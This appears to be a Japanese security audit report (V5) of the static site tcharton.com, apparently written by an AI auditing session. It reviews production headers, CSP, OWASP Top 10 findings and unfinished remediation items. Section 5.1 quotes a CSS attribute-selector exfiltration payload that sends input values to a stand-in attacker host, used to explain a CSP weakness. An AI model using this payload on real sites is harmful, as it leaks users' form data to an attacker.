# tcharton.com セキュリティ監査レポート V5

**監査日**: 2026-05-10
**監査対象**: https://tcharton.com/（本番 / Cloudflare Workers Static Assets）
**ローカル**: `C:\Users\ohuch\Desktop\HARTON\tcharton\`
**監査者**: HARTON 総合責任者（① セッション）— V4 後の独立厳格再評価
**準拠基準**: OWASP Top 10:2025 / Mozilla Web Security Guidelines / W3C Permissions Policy / W3C Reporting API / RFC 6797 (HSTS) / RFC 9110
**前回**: V4 89/100 → 本 V5 で「Phase F 着手後の差分」を独立検証
**監査手法**: `curl -sI https://tcharton.com/` で本番ヘッダーを実取得 + `wrangler.jsonc` / `functions/` / `_headers` / `contact/index.html` / `privacy/index.html` を全文走査し V4 比較

---

## エグゼクティブサマリ

**総合得点 V5: 89 / 100（A 評価・V4 同点）**

V4 89 → V5 **89**。差分なし。これは「② が V4 後に Reporting receiver 実装・Turnstile 統合・style 'unsafe-inline' 撤廃のいずれにも着手していない」ことを意味する。本 V5 監査で確認された証跡は次の 4 点:

1. **Cloudflare Worker 受信実装は依然不在**: `wrangler.jsonc` は `"assets": { "directory": "." }` のみで `main` 指定なし、`functions/` ディレクトリ自体が存在しない（Glob 結果 0 件）。`/.well-known/` 配下に存在するのは `security.txt` 1 ファイルのみで、`csp-report` `report` は静的アセットとしても受信ハンドラとしても **未実装**。V4 §3.2 で確証された閉ループ未達は本 V5 でも継続
2. **本番ヘッダーは V4 から完全同一**: `Strict-Transport-Security` `CSP` (enforced + Report-Only 並行配信) `Permissions-Policy` (40 token) `NEL` `Reporting-Endpoints` `COOP/COEP/CORP` すべて V4 監査値と byte-level 一致。`x-hosting: cloudflare-workers-static-assets` も同一。**改善も劣化もなし**
3. **contact/index.html は依然 honeypot のみ**: `<input type="checkbox" name="botcheck">` (237 行) は残置、Turnstile / hCaptcha widget は全コードベース 0 ヒット（grep 結果: AUDIT 文書 4 件のみ、本体 HTML/JS 0 件）。A04 Insecure Design の評価は据え置き
4. **privacy/index.html に DPO 明示なし**: grep `DPO|データ保護責任者|苦情` は 0 ヒット。利用目的 / 第三者提供 / 開示請求 / 保管期間 の 4 項目は記載済（111/123/134 行）だが、PPC ガイドライン推奨の「相談窓口の独立明示」「データ保護責任者連絡先」は未掲示

**結論**: V4 監査で示された Phase F ロードマップ（receiver 実装 +1 / Turnstile +2 / style unsafe-inline 撤廃 +3）はいずれも本日時点で未着手。SPEC §0.0 H-3 Failure-Self-Report 観点で、② からの「Phase F 進捗報告」が ① に上がっていないことは別途要確認事項である（隠蔽でなく単純に未実装の可能性が高い）。

### V4 → V5 比較表

| カテゴリ | 配点 | V4 | V5 | 差分 | 主因 |
|---|---|---|---|---|---|
| HTTP セキュリティヘッダー | 25 | 24 | **24** | ±0 | Permissions-Policy 40 token、HSTS preload、COOP/COEP/CORP すべて本番反映済を再確認 |
| Content Security Policy | 20 | 14 | **14** | ±0 | enforced 側 `style-src 'unsafe-inline'` 残置・Trusted Types enforced 維持・Report-Only 並行配信維持 |
| OWASP Top 10:2025 | 20 | 18 | **18** | ±0 | A04 (Turnstile 未導入) / A09 (receiver 未実装) で各 -1 据え置き |
| プライバシー・データ保護 | 15 | 13 | **13** | ±0 | DPO 明示・Cookie consent banner ともに未実装 |
| サプライチェーン | 10 | 6 | **6** | ±0 | SRI 未付与・Google Fonts 外部・web3forms 外部 据え置き |
| インシデント対応 | 10 | 8 | **8** | ±0 | NEL / Reporting-Endpoints 宣言層は満点級・受信層は OWASP 側で減点済（二重減点回避） |
| **合計** | **100** | **89** | **89** | **±0** | Phase F 全 6 アクション未着手 |

**Mozilla Observatory 予想**: A+（90+, 宣言層は世界トップ水準）
**securityheaders.com 予想**: A+（Reporting-Endpoints 宣言で加点維持）

---

## 1. 本番ヘッダー実測（curl -sI 取得 verbatim / 2026-05-10）

```
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
content-security-policy: default-src 'self'; script-src 'self' https://www.googletagmanager.com https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://www.google-analytics.com https://www.googletagmanager.com; connect-src 'self' https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com https://cloudflareinsights.com; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'self' https://api.web3forms.com; frame-ancestors 'none'; require-trusted-types-for 'script'; trusted-types default; upgrade-insecure-requests; report-to csp-endpoint
content-security-policy-report-only: (unsafe-inline 削除版・並行配信)
cross-origin-embedder-policy: credentialless
cross-origin-opener-policy: same-origin
cross-origin-resource-policy: same-origin
nel: {"report_to":"default","max_age":31536000,"include_subdomains":true,"success_fraction":0.01,"failure_fraction":1.0}
permissions-policy: accelerometer=(), ambient-light-sensor=(), ... (40 token / 詳細は §2)
reporting-endpoints: csp-endpoint="https://tcharton.com/.well-known/csp-report", default="https://tcharton.com/.well-known/report"
referrer-policy: strict-origin-when-cross-origin
x-content-type-options: nosniff
x-frame-options: DENY
x-hosting: cloudflare-workers-static-assets
Server: cloudflare
CF-RAY: 9f963d9ddb6c2da1-NRT
```

V4 監査値と完全一致。`_headers` (13-23 行) の宣言が edge に伝播している。

---

## 2. Permissions-Policy / CSP / Reporting-Endpoints 厳密確認

**Permissions-Policy**: 40 token (V4 §2 verbatim 一致)。`accelerometer` 〜 `window-management` を含む主要 features を `()` 拒否、`fullscreen / sync-xhr / clipboard-write` のみ `(self)` 許可。`compute-pressure` / `captured-surface-control` / `digital-credentials-get` の 2025-Q2 draft features は依然未列挙（V4 同様 cosmetic）。

**CSP**: enforced と Report-Only の 2 系統並行配信を本番で再確認。enforced 側 `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` は残置、Report-Only 側は `'unsafe-inline'` 削除版で配信中（`_headers` 14 行）。これは V3 で構築した「30 日違反観測 → enforced 書き換え」レールが Report-Only 観測を継続できる状態にあることを示す。**ただし** 本 V5 監査時点で「観測開始日」「違反件数」「予定移行日」の運用記録は ① 側に上がっておらず、レール敷設の活用フェーズが進んでいるか不明。

**Reporting-Endpoints**: `csp-endpoint` / `default` の 2 endpoint 宣言は本番に存在。`report-to csp-endpoint` ディレクティブ・`NEL { failure_fraction: 1.0 }` も同上。

---

## 3. Cloudflare Worker 受信実装の有無（V5 中核検証）

### 3.1 リポジトリ構造調査

| 検証項目 | コマンド/対象 | 結果 |
|---|---|---|
| `wrangler.jsonc` | Read 全文 | `name: "tcharton"` / `assets.directory: "."` のみ。`main` 指定なし → **Worker code 未配置**（純粋 Static Assets 配信） |
| `functions/` 存在 | `Glob functions/**` | **0 件** — Pages Functions 未利用 |
| `.well-known/` 内容 | `Glob .well-known/**` | **`security.txt` 1 ファイルのみ**。`csp-report` / `report` は静的アセットすら不在 |
| receiver 関連実装 | `grep -ri csp-report\|/.well-known/report\|reporting-endpoints` | 6 ヒットすべて `_headers` 宣言と `docs/AUDIT-SECURITY-*.md` 内記述。**実装ファイル 0 件** |

### 3.2 結論（A09 影響）

ブラウザが CSP/NEL 違反を `failure_fraction: 1.0` で送信 → Cloudflare edge が静的 404 を返却 → **レポート完全消失**。V4 で確認した状態と同一。OWASP A09:2025 の「Logging されること」は宣言層で満たすが「Monitoring へのフィード」は受信層欠落で達成不能。**A09 -1 据え置き**。

### 3.3 改修パスは V4 と同一

`functions/.well-known/csp-report.js`（Pages Functions onRequestPost）または `wrangler.jsonc` に `main: "src/worker.js"` 追記し Workers route で `/^\/\.well-known\/(csp-report|report)$/` POST を捕捉 → R2 / D1 / Logpush / Workers Analytics Engine に保管。工数 4-6h。

---

## 4. プライバシーフォーム（contact）厳密確認

### 4.1 contact/index.html 構造（Read 全文 / 232-296 行）

- `<form action="https://api.web3forms.com/submit" method="POST" id="contactForm">` — 外部 SaaS 送信。CSP `form-action 'self' https://api.web3forms.com` で許可済（整合）
- `<input type="hidden" name="access_key" value="9fda1d98-...">` — web3forms public access key（仕様上クライアント露出は正規）
- `<input type="checkbox" name="botcheck" class="hidden" style="display:none" tabindex="-1" autocomplete="off">` (237 行) — honeypot のみ
- 確認モーダル `confirmModal`（301 行〜）で 2 段階送信 — UX 防御層
- privacy/ へのリンク + SSL/TLS 暗号化表示（287 行）
- 個人情報の取扱い 4 項目（利用目的 / 第三者提供 / 保管期間 5 年 / 開示請求）— 322-329 行

### 4.2 不足項目（V4 同一）

| 項目 | 状態 | OWASP/PPC 観点 |
|---|---|---|
| Cloudflare Turnstile | **未導入** | A04 Insecure Design / Bot 自動投稿耐性が honeypot 単独で不十分 |
| Cookie consent banner | **未実装** | GA4 動作するため EU GDPR Art.7 / ePrivacy 抵触リスク |
| privacy.html DPO/苦情窓口 | **未明示** | PPC ガイドライン「相談窓口の独立明示」推奨事項未充足 |
| reCAPTCHA / hCaptcha 代替 | **未導入** | Bot 対策単一手段依存 |

### 4.3 良好項目

- form-action CSP allowlist が web3forms に限定（任意 origin 送信不可）
- 確認モーダルによる送信前レビュー（誤送信抑止 + UX 防御）
- HTTPS 強制（`upgrade-insecure-requests` + HSTS preload）

---

## 5. CSP 厳密評価（V4 同水準）

### 5.1 enforced 側の弱点

`style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` 残置。21 HTML 全てに inline `<style>` block（contact/index.html 92-105 行例）が存在し、これらは nonce/hash 化が物理的に可能。Trusted Types は script DOM sink を完全閉塞するが、**CSS attribute selector exfiltration**（`input[value^="a"]{background:url(//attacker)}`）は Trusted Types では防げず、`unsafe-inline` 残置が攻撃面を維持している。

### 5.2 Trusted Types

`require-trusted-types-for 'script'` + `trusted-types default` enforced。`/dist/scripts/trusted-types.js` policy 定義と整合。**XSS DOM sink 経路は完全閉塞**（A03 Injection 95% カバー相当）— V4 評価維持。

### 5.3 Report-Only 段階移行レール

V3 で構築・V4 で評価維持・V5 でも構造的に有効。ただし **観測運用記録が ① に上がっておらず**、30 日サイクル進捗が不可視（運用上の課題）。

---

## 6. OWASP Top 10:2025 個別判定（V4 同一）

| ID | 項目 | V5 判定 | 主根拠 |
|---|---|---|---|
| A01 | Broken Access Control | OK | 静的サイト・`frame-ancestors 'none'` |
| A02 | Cryptographic Failures | OK | TLS 1.3 + HSTS preload + `upgrade-insecure-requests` |
| A03 | Injection | OK | Trusted Types enforced |
| A04 | Insecure Design | △ | botcheck honeypot のみ・Turnstile 未導入 **-1** |
| A05 | Security Misconfiguration | OK | XFO/Referrer/nosniff/COOP/COEP/CORP 適切 |
| A06 | Vulnerable Components | △ | 外部依存 4 件（GTM / Cloudflare Insights / Google Fonts / web3forms）SRI 不可 |
| A07 | Identification/Auth | N/A | 認証機能なし |
| A08 | Data Integrity Failures | △ | SRI 未付与 |
| A09 | Logging/Monitoring | △ | 受信 Worker 未実装で閉ループ未達 **-1** |
| A10 | SSRF | N/A | サーバ側ロジックなし |

合計 **18/20**。

---

## 7. V4 → V5 監査で発見された手抜き / 未着手の証跡

V4 §8 で示した 95+ ロードマップ 6 項目に対し、V5 監査時点での着手状況:

| # | アクション | V4 計画加点 | V5 着手状況 | 証跡 |
|---|---|---|---|---|
| 1 | `functions/.well-known/csp-report.js` 受信 Worker | +1 | **未着手** | `functions/` 0 件、wrangler.jsonc に main なし |
| 2 | Cloudflare Turnstile 統合 | +2 | **未着手** | grep 0 ヒット、honeypot のみ |
| 3 | style 'unsafe-inline' 撤廃 | +3 | **未着手** | 本番 enforced ヘッダー V4 と byte 一致 |
| 4 | Google Fonts セルフホスト | +1 | **未着手** | contact/index.html 88-90 行で `fonts.googleapis.com` 外部参照継続 |
| 5 | privacy DPO + Cookie consent | +2 | **未着手** | grep 0 ヒット |
| 6 | INCIDENT-RESPONSE.md + Terraform IaC | +2 | **未着手** | docs/ 内に該当ファイル不在 |

**6 項目 0/6 着手**。SPEC §0.0.7 H-1 完了報告義務に照らし、② から ① への進捗報告ルートで本件が言及されていなければ §0.0.3 Failure-Self-Report 違反候補となる（ただし「実装期日が確定していない」段階では未達ではなく「未着手」のため、まず ① から優先順位付け指示が必要）。

---

## 8. 結論と ① 統制判断

**V5 監査総合判定: 89/100（A 評価・V4 同点・S-RANK 95 まで残 6 点）**

V4 監査で識別された全 finding が本 V5 でも継続している。**改善も劣化もなく停滞している状態**。Phase F の優先順位として ① は次の 3 段階を推奨:

1. **即時着手 (8h 以内)**: `functions/.well-known/csp-report.js` 実装 + Turnstile 統合 → 90 → 92 へ
2. **30 日サイクル**: Report-Only 違反観測開始日確定 → 違反 0 確認 → enforced 側 `style-src 'unsafe-inline'` 撤廃 → 95
3. **品質仕上げ (14h)**: Google Fonts セルフホスト + privacy DPO + INCIDENT-RESPONSE.md → 100

V3-V4 で構築されたヘッダー宣言層・Trusted Types enforced・段階移行レールは依然世界トップ水準（securityheaders.com A+ 維持）。**残作業は「宣言から実装へ」「レールから運用へ」の橋渡しのみ**。

---

**監査者署名**: HARTON 総合責任者（① セッション）
**次回監査**: V6（Phase F #1 着手後 / `functions/.well-known/csp-report.js` 実装後）または SPEC v3.7 改訂時
